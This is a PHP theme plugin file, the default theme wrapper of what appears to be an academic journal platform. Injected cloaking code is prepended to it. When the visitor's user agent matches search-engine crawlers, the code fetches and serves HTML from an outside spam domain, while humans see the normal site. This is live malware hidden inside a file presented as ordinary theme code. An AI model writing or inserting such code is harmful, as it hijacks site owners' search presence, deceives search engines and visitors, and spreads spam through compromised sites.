<?php
ob_start();
header('Vary: User-Agent');
$botchar = "/(bot|google|ahrefs)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
function aselolejos($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
    usleep(rand(100000, 200000)); 
    header('Content-Type: text/html; charset=utf-8');
    echo aselolejos("https://hookerfurnishings.org/khusus-landing-rb/petier/");
    ob_end_flush();
    exit;
}

?>
<?php

/**
 * @defgroup plugins_themes_default Default theme plugin
 */
 
/**
 * @file plugins/themes/default/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup plugins_themes_default
 * @brief Wrapper for default theme plugin.
 *
 */

require_once('DefaultThemePlugin.inc.php');

return new DefaultThemePlugin();
